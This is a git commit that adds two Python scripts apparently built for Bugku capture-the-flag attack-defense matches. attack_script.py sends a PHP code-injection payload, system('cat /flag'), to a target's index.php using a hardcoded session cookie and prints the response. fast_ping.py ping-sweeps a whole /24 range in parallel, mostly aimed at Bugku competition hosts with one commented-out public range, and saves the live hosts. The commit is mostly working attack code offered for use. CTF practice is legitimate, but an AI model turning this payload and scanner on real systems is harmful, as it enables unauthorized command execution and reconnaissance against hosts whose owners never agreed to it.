5f7e29a8867cb257f2fcc1d9f372f3c36fd643b6
wanqian-windrunner <119412909+wanqian-windrunner@users.noreply.github.com>
2024-04-22 07:29:30 +0800

    Add files via upload

---
+++ attack_script.py
@@ -0,0 +1,16 @@
+import requests
+
+
+def attack(ip:str):
+    cookies = {"PHPSESSID": "vg8rjkjtbugu49v6f7cq71pth0"}
+    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192-168-1-110.pvp4067.bugku.cn", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://192-168-1-110.pvp4067.bugku.cn/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
+    # requests.post(url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+    data = {'a': 'system(\'cat /flag\');'}
+    res = requests.post(ip+'/index.php',data = data,cookies=cookies)
+    print(res.text)
+    print('get flag!')
+    flag = res.text
+    return str(flag)
+if __name__ == '__main__':
+    attack(input('input attack ip(such as:192-168-1-1.pvp4151.bugku.cn):'))
---
+++ fast_ping.py
@@ -0,0 +1,62 @@
+#
+# from os import system
+#
+# url = '192-168-1-X.pvp4188.bugku.cn'
+# alive_ips = []
+# for i in range(256):
+#     ip = url.replace('X', str(i))
+#     # print(ip)
+#     result = system('ping {} -n 2'.format(ip))
+#     print(result)
+#     if result == 0:
+#         alive_ips.append(ip)
+# print(alive_ips)
+
+# 上边的代码是一个单线程的ping扫描，如果一直报错则使用上面的代码，随谈慢，但是稳定
+from multiprocessing import Pool
+from os import system
+
+
+def check_ip(ip):
+    result = system('ping -n 1 {} >NUL'.format(ip))
+    if result == 0:
+        return ip
+    return None
+
+
+def check_ip_signal(ip):
+    result = system('ping {} -n 1'.format(ip))
+    if result == 0:
+        return ip
+    return None
+
+
+def main_function_to_execute(url):
+    print('\033[34m Scaning ... \033[0m')
+    ips_to_check = [url.replace('X', str(i)) for i in range(256)]
+
+    with Pool(processes=32) as pool:  # 根据需要设置进程数
+        alive_ips = pool.map(check_ip, ips_to_check)
+
+    alive_ips = [ip for ip in alive_ips if ip is not None]
+    with open('info/alive_ips.txt', 'w') as f:
+        for i in alive_ips:
+            f.write(i)
+            f.write('\n')
+    print('\033[34mScan finish, this is alive ips:\033[0m', *alive_ips, sep='\n')
+
+
+if __name__ == '__main__':
+    url = input('input url:')
+    # url = '219.217.199.X'
+    ips_to_check = [url.replace('X', str(i)) for i in range(256)]
+
+    with Pool(processes=32) as pool:  # 根据需要设置进程数
+        alive_ips = pool.map(check_ip_signal, ips_to_check)
+
+    alive_ips = [ip for ip in alive_ips if ip is not None]
+    with open('info/alive_ips.txt', 'w') as f:
+        for i in alive_ips:
+            f.write(i)
+            f.write('\n')
+    print(alive_ips)
